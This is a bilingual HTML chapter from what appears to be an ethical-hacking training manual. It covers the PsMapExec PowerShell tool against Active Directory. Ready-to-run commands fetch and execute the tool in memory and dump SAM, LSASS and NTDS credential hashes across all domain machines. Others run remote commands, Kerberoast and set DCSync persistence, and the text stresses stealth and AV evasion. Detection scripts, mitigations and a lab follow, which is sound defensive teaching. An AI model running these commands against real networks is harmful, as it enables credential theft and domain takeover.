@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 9 — PsMapExec | Ch. 9</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 9 — PsMapExec</h1>
+<div class="sub">Ch. 9 — Hacking with PsMapExec</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / AD</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#load">Carregar em Memória</a></li><li><a href="#sam">SAM Hashes</a></li>
+<li><a href="#lsass">LSASS Hashes</a></li><li><a href="#rce">Execução Remota</a></li>
+<li><a href="#kerb">Kerberos Tickets</a></li><li><a href="#kerberoast">Kerberoasting</a></li>
+<li><a href="#ekeys">Ekeys</a></li><li><a href="#timeroast">Timeroasting</a></li>
+<li><a href="#files">Files</a></li><li><a href="#acl">ACL Persistence</a></li>
+<li><a href="#ntds">NTDS Dump</a></li><li><a href="#extra">Métodos Extra</a></li>
+<li><a href="#impact">Scripts de Impacto</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o PsMapExec como alternativa PowerShell ao CrackMapExec/NetExec; carregar o script em memória; dump de SAM e LSASS; execução remota de comandos (SMB/WinRM/WMI); dump de tickets Kerberos (KerbDump); Kerberoasting; extração de Ekeys; Timeroasting; descoberta de ficheiros com credenciais; persistência via ACL (DCSync/Elevate); dump de NTDS; conhecer os métodos e módulos adicionais suportados; <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand PsMapExec as a PowerShell alternative to CrackMapExec/NetExec; load the script in memory; dump SAM and LSASS; remote command execution (SMB/WinRM/WMI); dump Kerberos tickets (KerbDump); Kerberoasting; extract Ekeys; Timeroasting; discover files with credentials; ACL persistence (DCSync/Elevate); NTDS dump; know the additional supported methods and modules; <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O PsMapExec foi desenvolvido por The-Viper-One e inspirado no CrackMapExec/NetExec. Não tem funcionalidades idênticas, mas tem <strong>furtividade</strong>: carrega diretamente em memória sem tocar no disco. Usa a sessão atual para executar comandos, por isso nem sempre precisas de saber a password da vítima. Como a maioria das ferramentas ofensivas públicas, é sinalizado por AV se carregado diretamente — às vezes os hackers reescrevem os scripts mantendo as funções core para contornar o AV.</span>
+<span class="en">PsMapExec was developed by The-Viper-One and inspired by CrackMapExec/NetExec. It doesn't have identical features, but it has <strong>stealth</strong>: it loads directly in memory without touching disk. It uses the current session to execute commands, so you don't always need to know the victim's password. Like most publicly available offensive tools, it's flagged by AV if loaded directly — sometimes hackers rewrite scripts keeping core functions to bypass AV.</span>
+</div>
+</section>
+
+<section id="load">
+<h2>3. Carregar em Memória / Loading in Memory <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Para evitar tocar no disco e deixar rastos forenses desnecessários, executa o script diretamente em memória:</span>
+<span class="en">To avoid touching disk and leaving unnecessary forensic traces, execute the script directly in memory:</span>
+</div>
+<pre>PS > IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")</pre>
+</section>
+
+<section id="sam">
+<h2>4. Dump de SAM Hashes <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O SAM dá-te hashes de contas locais; o LSASS contém os hashes de todos os utilizadores ligados. Para dump de contas locais de uma máquina:</span>
+<span class="en">SAM gives you local account hashes; LSASS holds hashes of all connected users. To dump local accounts from a single machine:</span>
+</div>
+<pre>PS > PsMapExec smb -Targets MANAGER-1 -Module SAM -ShowOutput</pre>
+<div class="lang">
+<span class="pt">Para todas as máquinas do domínio:</span>
+<span class="en">For all machines in the domain:</span>
+</div>
+<pre>PS > PsMapExec smb -Targets all -Module SAM -ShowOutput</pre>
+<div class="lang">
+<span class="pt">O output é limpo e inclui apenas contas locais válidas. Mas lembra-te: quanto menos ruído, melhor.</span>
+<span class="en">The output is clean and only includes valid local accounts. But remember: the less noise, the better.</span>
+</div>
+</section>
+
+<section id="lsass">
+<h2>5. Dump de LSASS Hashes <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">As credenciais LSASS são armazenadas temporariamente e contêm contas de domínio que precisas de testar. Em algumas organizações, utilizadores críticos pertencem ao <strong>Protected Users Group</strong>, o que impede que as credenciais sejam cacheadas em memória.</span>
+<span class="en">LSASS credentials are stored temporarily and hold domain accounts you need to test. In some organizations, critical users belong to the <strong>Protected Users Group</strong>, which prevents credentials from being cached in memory.</span>
+</div>
+<h3>5.1 Local (shell elevada) / Local (elevated shell)</h3>
+<pre>PS > PsMapExec smb -Targets "localhost" -Module "LogonPasswords" -ShowOutput</pre>
+<h3>5.2 Remoto com credenciais / Remote with credentials</h3>
+<pre>PS > PsMapExec smb -Targets "DC" -Username "user" -Password "password" -Module "LogonPasswords" -ShowOutput</pre>
+</section>
+
+<section id="rce">
+<h2>6. Execução Remota de Comandos / Remote Command Execution <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Cada rede é diferente. Algumas empresas segmentam para prevenir movimento lateral — nesse caso precisas de <strong>pivot</strong>. Um host de pivot tem a interface de rede que precisas ou consegue fazer ping a hosts noutra sub-rede.</span>
+<span class="en">Every network is different. Some companies segment to prevent lateral movement — in that case you need to <strong>pivot</strong>. A pivot host has the network interface you need or can ping hosts on another subnet.</span>
+</div>
+<h3>6.1 Ver interfaces em todas as máquinas / View interfaces on all machines</h3>
+<pre>PS > PsMapExec SMB -Target all -Username "user" -Password "password" -Command "ipconfig" -Domain "sekvoya.local"</pre>
+<h3>6.2 Máquina única / Single machine</h3>
+<pre>PS > PsMapExec SMB -Target "DC" -Username "user" -Password "password" -Command "ipconfig" -Domain "sekvoya.local"</pre>
+<h3>6.3 Ativar WinRM / Enable WinRM</h3>
+<pre>PS > PsMapExec SMB -Target "MANAGER-1" -Username "user" -Password "password" -Command "winrm quickconfig -q" -Domain "sekvoya.local"</pre>
+<div class="lang">
+<span class="pt">O WinRM é frequentemente usado para movimento lateral.</span>
+<span class="en">WinRM is often used for lateral movement.</span>
+</div>
+</section>
+
+<section id="kerb">
+<h2>7. Tickets Kerberos (KerbDump) <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O módulo Kerbdump extrai tickets Kerberos de hosts remotos, que podem ser usados em ataques <strong>Pass the Ticket</strong>. Alguns domínios desativam NTLM por segurança — é aí que precisas destes tickets. O tráfego Kerberos é normal e frequente em AD, por isso se tiveres escolha entre NTLM e Kerberos, vai de Kerberos.</span>
+<span class="en">The Kerbdump module extracts Kerberos tickets from remote hosts, which can be used in <strong>Pass the Ticket</strong> attacks. Some domains disable NTLM for security — that's when you need these tickets. Kerberos traffic is normal and frequent in AD, so if you have a choice between NTLM and Kerberos, go with Kerberos.</span>
+</div>
+<pre>PS > PsMapExec -Method smb -Targets DC -Username "user" -Password "password" -Module "KerbDump" -ShowOutput</pre>
+<div class="lang">
+<span class="pt">O script parseia o output e atribui os tickets a variáveis que podes usar para movimento lateral.</span>
+<span class="en">The script parses the output and assigns tickets to variables you can use for lateral movement.</span>
+</div>
+</section>
+
+<section id="kerberoast">
+<h2>8. Kerberoasting <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Ao contrário do KerbDump, o Kerberoasting não dá tickets reutilizáveis — precisam de ser crackeados para recuperar a password. Ocasionalmente encontras Domain Admins ou contas de serviço com um SPN atribuído; é esse SPN que as torna vulneráveis. O Kerberoasting em si não requer privilégios, por isso podes obter um hash de admin usando apenas um utilizador de domínio de baixo privilégio.</span>
+<span class="en">Unlike KerbDump, Kerberoasting doesn't give reusable tickets — they need to be cracked to recover the password. Occasionally you find Domain Admins or service accounts with an SPN assigned; that SPN makes them vulnerable. Kerberoasting itself doesn't require privileges, so you can get an admin hash using just a low-privilege domain user.</span>
+</div>
+<h3>8.1 Atribuir SPN a um utilizador / Assign SPN to a user</h3>
+<pre>PS > PsMapExec ldap -Targets DC -Module AddSPN -TargetDN "CN=username,DC=SEKVOYA,DC=LOCAL"</pre>
+<h3>8.2 Kerberoast / Kerberoast</h3>
+<pre>PS > PsMapExec kerberoast -Target "DC" -Username "user" -Password "password" -Option "kerberoast:adm_ivanov" -ShowOutput</pre>
+</section>
+
+<section id="ekeys">
+<h2>9. Ekeys <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Os tickets Kerberos são cifrados com chaves especiais de encriptação; podes extrair essas chaves para desencriptar ou até forjar tickets. Útil para persistência e movimento lateral.</span>
+<span class="en">Kerberos tickets are encrypted with special encryption keys; you can extract those keys to decrypt or even forge tickets. Useful for persistence and lateral movement.</span>
+</div>
+<pre>PS > PsMapExec wmi -Targets all -Module ekeys -ShowOutput</pre>
+</section>
+
+<section id="timeroast">
+<h2>10. Timeroasting <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Este ataque explora a forma como as máquinas AD sincronizam relógios via NTP. Os hackers podem obter hashes de contas de computador. As passwords de computador são strings grandes e aleatórias — não são crackáveis, a menos que a password corresponda ao nome do computador (configuração pré-Windows 2000). Com privilégios de Domain Admin, podes transformar um utilizador de domínio em computador de domínio, obter o hash e reverter a alteração — forma muito furtiva de obter hashes crackáveis.</span>
+<span class="en">This attack exploits how AD machines sync clocks via NTP. Hackers can get hashes for computer accounts. Computer passwords are big random strings — not crackable, unless the password matches the computer name (pre-Windows 2000 config). With Domain Admin privileges, you can turn a domain user into a domain computer, get the hash, and revert the change — a very stealthy way to get crackable hashes.</span>
+</div>
+<pre>PS > PsMapExec ldap -Targets DC -Module timeroast -ShowOutput</pre>
+</section>
+
+<section id="files">
+<h2>11. Files — Encontrar Credenciais em Texto / Find Plaintext Credentials <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Alguns utilizadores guardam credenciais em ficheiros de texto no Desktop. O módulo <code class="inline">Files</code> encontra ficheiros não-padrão nos diretórios dos utilizadores.</span>
+<span class="en">Some users store credentials in text files on their Desktop. The <code class="inline">Files</code> module finds non-default files within user directories.</span>
+</div>
+<pre>PS > PsMapExec wmi -Targets all -Module Files -ShowOutput</pre>
+</section>
+
+<section id="acl">
+<h2>12. ACL Persistence <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Os hackers cometem erros e os defensores tomam medidas para os expulsar. Uma vez mudadas as credenciais, não há muito a fazer — a menos que tenhas <strong>persistência via ACL</strong>. O privilégio DCSync é um dos mais comuns: o teu computador impersona um DC e pede hashes de password. Outro comum é <strong>GenericAll</strong> sobre o AdminSDHolder, que te permite adicionar membros a Domain Admins e mudar as passwords dos seus membros.</span>
+<span class="en">Hackers make mistakes and defenders take measures to evict them. Once credentials change, there's not much you can do — unless you have <strong>ACL persistence</strong>. DCSync privilege is one of the most common: your computer impersonates a DC and requests password hashes. Another common one is <strong>GenericAll</strong> over AdminSDHolder, letting you add members to Domain Admins and change their passwords.</span>
+</div>
+<pre>PS > PsMapExec ldap -Target DC -Module Elevate -TargetDN "CN=username,DC=SEKVOYA,DC=LOCAL"</pre>
+</section>
+
+<section id="ntds">
+<h2>13. NTDS Dump <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O dump do NTDS é o estágio final, uma vez obtidos privilégios de Domain Admin. O PsMapExec obtém o NTDS.dit e extrai todos os hashes NTLM. O NTDS tem todas as contas que existiram no domínio.</span>
+<span class="en">The NTDS dump is the final stage once Domain Admin privileges are obtained. PsMapExec gets the NTDS.dit and extracts all NTLM hashes. NTDS has all accounts that ever existed in the domain.</span>
+</div>
+<pre>PS > PsMapExec SMB -Targets "DC" -Username "user" -Password "password" -Module NTDS -ShowOutput</pre>
+</section>
+
+<section id="extra">
+<h2>14. Métodos e Módulos Extra <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">A documentação do GitHub lista métodos e módulos adicionais suportados pelo PsMapExec:</span>
+<span class="en">The GitHub documentation lists additional methods and modules supported by PsMapExec:</span>
+</div>
+<h3>14.1 Métodos / Methods</h3>
+<table>
+<tr><th>Método</th><th>Descrição</th></tr>
+<tr><td>DCSync</td><td>DCSync</td></tr>
+<tr><td>IPMI</td><td>Dump IPMI hashes</td></tr>
+<tr><td>MSSQL</td><td>Verificar acesso, executar comandos</td></tr>
+<tr><td>RDP</td><td>Verificar acesso</td></tr>
+<tr><td>Spray</td><td>Password/hash spraying</td></tr>
+<tr><td>SessionHunter</td><td>Verificar acesso, executar comandos</td></tr>
+<tr><td>VNC</td><td>Verificar acesso sem auth</td></tr>
+<tr><td>WinRM</td><td>Verificar acesso, executar comandos</td></tr>
+<tr><td>WMI</td><td>Verificar acesso, executar comandos</td></tr>
+</table>
+<h3>14.2 Módulos / Modules</h3>
+<table>
+<tr><th>Módulo</th><th>Descrição</th></tr>
+<tr><td>ConsoleHistory</td><td>Dump do histórico PowerShell</td></tr>
+<tr><td>FileZilla</td><td>Dump de credenciais FileZilla</td></tr>
+<tr><td>MDF</td><td>Dump de hashes de BD MSSQL</td></tr>
+<tr><td>Notepad</td><td>Dump de ficheiros de backup do Notepad</td></tr>
+<tr><td>NTLM</td><td>Hash NTLM por sessão de logon</td></tr>
+<tr><td>SCCM</td><td>Dump de credenciais NAA locais e task sequences</td></tr>
+<tr><td>SessionExec</td><td>Executar comandos sob cada sessão</td></tr>
+<tr><td>TGTDeleg</td><td>Obter TGT fresco por sessão</td></tr>
+<tr><td>VNC</td><td>Dump de credenciais VNC</td></tr>
+<tr><td>Wi-Fi</td><td>Dump de credenciais Wi-Fi</td></tr>
+<tr><td>WinSCP</td><td>Dump de credenciais WinSCP</td></tr>
+</table>
+</section>
+
+<section id="impact">
+<h2>15. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar atividade compatível com PsMapExec, com output legível e exportação para relatório.</span>
+<span class="en">The scripts below help the blue team detect activity consistent with PsMapExec, with readable output and report export.</span>
+</div>
+
+<h3>15.1 Script 9.1 — Deteção de Carregamento em Memória / In-Memory Loading Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar <code class="inline">IEX(New-Object Net.WebClient).DownloadString</code> e strings relacionadas com PsMapExec em Script Block Logging (4104). <strong>Evidência:</strong> <code class="inline">psmapexec-load.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect <code class="inline">IEX(New-Object Net.WebClient).DownloadString</code> and PsMapExec-related strings in Script Block Logging (4104). <strong>Evidence:</strong> <code class="inline">psmapexec-load.csv</code>.</span>
+</div>
+<pre># Script 9.1 - In-Memory Loading Detection
+$out = ".\psmapexec-load.csv"
+$patterns = @("PsMapExec","DownloadString.*PsMapExec","IEX.*PsMapExec")
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 2000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
+    $msg = $_.Message
+    foreach ($p in $patterns) { if ($msg -match $p) { $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) } } }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>15.2 Script 9.2 — Deteção de Dump SAM/LSASS / SAM/LSASS Dump Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar acesso suspeito a SAM/LSASS via Sysmon (Event 10) e processos como <code class="inline">rundll32</code> ou <code class="inline">powershell</code> a aceder a <code class="inline">lsass.exe</code>. <strong>Evidência:</strong> <code class="inline">lsass-access.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect suspicious SAM/LSASS access via Sysmon (Event 10) and processes like <code class="inline">rundll32</code> or <code class="inline">powershell</code> accessing <code class="inline">lsass.exe</code>. <strong>Evidence:</strong> <code class="inline">lsass-access.csv</code>.</span>
+</div>
+<pre># Script 9.2 - LSASS Access Detection (Sysmon required)
+$out = ".\lsass-access.csv"
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 2000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 10 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $target = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetImage").'#text'
+    $source = ($xml.Event.EventData.Data | Where-Object Name -eq "SourceImage").'#text'
+    if ($target -match "lsass\.exe" -and $source -notmatch "MsMpEng|svchost") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Source=$source; Target=$target }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] LSASS access hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>15.3 Script 9.3 — Deteção de Timeroasting/SPN / Timeroasting/SPN Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar criação suspeita de SPN e alterações a <code class="inline">userAccountControl</code> em contas de utilizador (indicadores de Timeroasting/AddSPN). <strong>Evidência:</strong> <code class="inline">spn-changes.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect suspicious SPN creation and <code class="inline">userAccountControl</code> changes on user accounts (Timeroasting/AddSPN indicators). <strong>Evidence:</strong> <code class="inline">spn-changes.csv</code>.</span>
+</div>
+<pre># Script 9.3 - SPN/Timeroasting Detection (requires AD module)
+Import-Module ActiveDirectory -EA Stop
+$out = ".\spn-changes.csv"
+$hits = @()
+Get-ADUser -Filter * -Properties servicePrincipalName,userAccountControl,whenChanged |
+  Where-Object { $_.servicePrincipalName -and $_.whenChanged -gt (Get-Date).AddDays(-7) } |
+  ForEach-Object {
+    $hits += [PSCustomObject]@{ User=$_.SamAccountName; SPN=($_.servicePrincipalName -join ";"); UAC=$_.userAccountControl; Changed=$_.whenChanged }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Recent SPN changes: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+</section>
+
+<section id="mitre">
+<h2>16. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>OS Credential Dumping: SAM</td><td>T1003.002</td><td>SAM</td></tr>
+<tr><td>OS Credential Dumping: LSASS Memory</td><td>T1003.001</td><td>LogonPasswords</td></tr>
+<tr><td>Steal or Forge Kerberos Tickets: Kerberoasting</td><td>T1558.003</td><td>Kerberoast</td></tr>
+<tr><td>Steal or Forge Kerberos Tickets: AS-REP Roasting</td><td>T1558.004</td><td>Timeroasting</td></tr>
+<tr><td>Use Alternate Authentication Material: Pass the Ticket</td><td>T1550.003</td><td>KerbDump</td></tr>
+<tr><td>Account Manipulation</td><td>T1098</td><td>AddSPN, Elevate</td></tr>
+<tr><td>OS Credential Dumping: NTDS</td><td>T1003.003</td><td>NTDS</td></tr>
+<tr><td>Remote Services: SMB/Windows Admin Shares</td><td>T1021.002</td><td>Execução remota</td></tr>
+<tr><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td><td>Todo o capítulo</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>17. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Protected Users Group</strong> — impede cache de credenciais em LSASS.</li>
+<li><strong>Credential Guard</strong> — protege LSASS contra dump.</li>
+<li><strong>Script Block Logging (4104) + AMSI</strong> — deteta <code class="inline">IEX</code> + <code class="inline">DownloadString</code> com PsMapExec.</li>
+<li><strong>Sysmon Event 10</strong> — monitoriza acesso a <code class="inline">lsass.exe</code>.</li>
+<li><strong>Desativar NTLM</strong> onde possível — força Kerberos, mas Kerberoasting continua a ser risco.</li>
+<li><strong>Monitorizar alterações a <code class="inline">servicePrincipalName</code></strong> e <code class="inline">userAccountControl</code> — deteta AddSPN/Timeroasting.</li>
+<li><strong>Auditar ACLs</strong> — DCSync e GenericAll sobre AdminSDHolder são críticos.</li>
+<li><strong>Reduzir MAQ para 0</strong> — remove vetor de criação de computadores.</li>
+<li><strong>Monitorizar execução remota</strong> — SMB, WinRM, WMI em hosts não esperados.</li>
+<li><strong>Honeytokens</strong> — ficheiros <code class="inline">Files</code> falsos com credenciais isca.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>18. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> DC Windows Server + VM cliente加入 ao domínio. Snapshot antes. Carregar PsMapExec em memória e testar os módulos principais (SAM, LogonPasswords, KerbDump, Files). Correr os scripts de deteção e comparar.</span>
+<span class="en"><strong>Scenario:</strong> Windows Server DC + domain-joined client VM. Snapshot before. Load PsMapExec in memory and test main modules (SAM, LogonPasswords, KerbDump, Files). Run detection scripts and compare.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Carregar PsMapExec</td><td><code class="inline">IEX(New-Object System.Net.WebClient).DownloadString("...")</code></td><td>Prompt</td></tr>
+<tr><td>2</td><td>SAM dump</td><td><code class="inline">PsMapExec smb -Targets localhost -Module SAM -ShowOutput</code></td><td>Output</td></tr>
+<tr><td>3</td><td>LSASS dump</td><td><code class="inline">PsMapExec smb -Targets localhost -Module LogonPasswords -ShowOutput</code></td><td>Output</td></tr>
+<tr><td>4</td><td>KerbDump</td><td><code class="inline">PsMapExec -Method smb -Targets DC -Module KerbDump -ShowOutput</code></td><td>Output</td></tr>
+<tr><td>5</td><td>Files</td><td><code class="inline">PsMapExec wmi -Targets all -Module Files -ShowOutput</code></td><td>Output</td></tr>
+<tr><td>6</td><td>Deteção carregamento</td><td><code class="inline">.\psmapexec-load.ps1</code></td><td><code class="inline">psmapexec-load.csv</code></td></tr>
+<tr><td>7</td><td>Deteção LSASS</td><td><code class="inline">.\lsass-access.ps1</code></td><td><code class="inline">lsass-access.csv</code></td></tr>
+<tr><td>8</td><td>Deteção SPN</td><td><code class="inline">.\spn-changes.ps1</code></td><td><code class="inline">spn-changes.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Output de SAM, LSASS, KerbDump, Files</li>
+<li><code class="inline">psmapexec-load.csv</code></li>
+<li><code class="inline">lsass-access.csv</code></li>
+<li><code class="inline">spn-changes.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>19. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que o PsMapExec é mais furtivo que o NetExec? / Why is PsMapExec stealthier than NetExec?</li>
+<li>Qual a diferença entre SAM e LSASS? / What's the difference between SAM and LSASS?</li>
+<li>O que faz o KerbDump e porque é útil? / What does KerbDump do and why is it useful?</li>
+<li>Porque é que o Kerberoasting não requer privilégios elevados? / Why doesn't Kerberoasting require elevated privileges?</li>
+<li>O que é o Timeroasting e como se mitiga? / What is Timeroasting and how to mitigate it?</li>
+<li>Qual a diferença entre DCSync e GenericAll sobre AdminSDHolder? / What's the difference between DCSync and GenericAll over AdminSDHolder?</li>
+<li>Como se deteta o carregamento do PsMapExec em memória? / How to detect PsMapExec loading in memory?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>20. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o PsMapExec: carregamento em memória, dump de SAM e LSASS, execução remota (SMB/WinRM/WMI), KerbDump, Kerberoasting, Ekeys, Timeroasting, Files, persistência via ACL (DCSync/Elevate) e NTDS dump. A documentação do GitHub acrescenta métodos (IPMI, MSSQL, RDP, Spray, SessionHunter, VNC) e módulos (ConsoleHistory, FileZilla, MDF, Notepad, NTLM, SCCM, SessionExec, TGTDeleg, Wi-Fi, WinSCP). Acrescentámos <strong>três scripts de impacto</strong> (deteção de carregamento, acesso a LSASS, alterações a SPN) que ajudam o blue team a detetar atividade compatível com PsMapExec. O Cap. 10 (Timeroasting Users) aprofunda o ataque ao NTP.</span>
+<span class="en">This chapter covered PsMapExec: in-memory loading, SAM and LSASS dumps, remote execution (SMB/WinRM/WMI), KerbDump, Kerberoasting, Ekeys, Timeroasting, Files, ACL persistence (DCSync/Elevate), and NTDS dump. GitHub documentation adds methods (IPMI, MSSQL, RDP, Spray, SessionHunter, VNC) and modules (ConsoleHistory, FileZilla, MDF, Notepad, NTLM, SCCM, SessionExec, TGTDeleg, Wi-Fi, WinSCP). We added <strong>three impact scripts</strong> (load detection, LSASS access, SPN changes) that help the blue team detect PsMapExec-compatible activity. Ch. 10 (Timeroasting Users) deepens the NTP attack.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 9 / Ethical Hacker Training Manual — Ch. 9</div>
+<div style="margin-top:.6rem">
+<a href="cap08.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap10.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
